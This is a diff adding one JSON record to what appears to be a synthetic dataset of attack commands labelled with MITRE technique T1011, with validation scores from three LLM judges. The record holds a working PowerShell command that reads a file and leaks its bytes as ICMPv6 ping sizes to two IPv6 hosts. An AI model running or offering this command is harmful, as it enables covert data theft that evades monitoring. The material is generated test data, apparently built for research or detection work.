@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$dh='fd00:feed::a'; $dl='fd00:feed::b'; $bytes=[IO.File]::ReadAllBytes('C:\\Users\\Public\\report.bin'); foreach($b in $bytes){ $hi=($b -shr 4); $lo=($b -band 0x0F); Test-Connection -ComputerName $dh -Count 1 -BufferSize (400 + $hi) -IPv6 -Quiet | Out-Null; Test-Connection -ComputerName $dl -Count 1 -BufferSize (400 + $lo) -IPv6 -Quiet | Out-Null }",
+  "explanation": "Splits each byte into nibbles and sends them as ICMPv6 payload sizes to two different IPv6 endpoints, employing an alternate medium per T1011.",
+  "rationale_steps": [
+    "Split each byte into high and low 4-bit values.",
+    "Encode each nibble into the -BufferSize field with a safe offset.",
+    "Send to separate IPv6 destinations to facilitate decoding and framing."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-f38205c7-89409f7d",
+  "source_prompt_hash": "f38205c7",
+  "timestamp_utc": "2025-09-30T08:38:57.416507Z",
+  "validation": {
+    "syntax_ok": true,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell is well-formed with balanced quotes/braces, valid operators and Test-Connection parameters, and proper command separators.",
+        "semantic_score": 2,
+        "semantic_justification": "While it plausibly exfiltrates data via ICMPv6 by encoding nibbles in payload sizes, this maps to exfiltration over an alternative protocol (e.g., T1048) rather than a different network medium as defined by T1011.",
+        "combined_score": 3.5,
+        "confidence": 0.85,
+        "timestamp": "2025-10-01T01:16:46.766859Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command is perfectly well-formed with balanced parentheses, proper variable declarations, correct method calls, and appropriate pipeline operators.",
+        "semantic_score": 5,
+        "semantic_justification": "The command effectively implements exfiltration over an alternative network medium by encoding file data into ICMPv6 packet sizes and transmitting to IPv6 addresses, which aligns perfectly with T1011 technique.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T01:16:53.114707Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command is perfectly well-formed, using valid cmdlet syntax, variable assignments, loop structure, bitwise operators, and correct parameter usage for Test-Connection.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately implements the claimed intent by reading a file, encoding each byte into nibbles via ICMPv6 payload sizes, and sending them to specified endpoints, which constitutes a plausible exfiltration mechanism compatible with the T1011 'alternate medium' context if the network routing is configured appropriately.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T06:28:14.850545Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.0,
+    "llm_average_score": 4.5,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null,
+    "Syntax_Run_Details": ""
+  }
+}
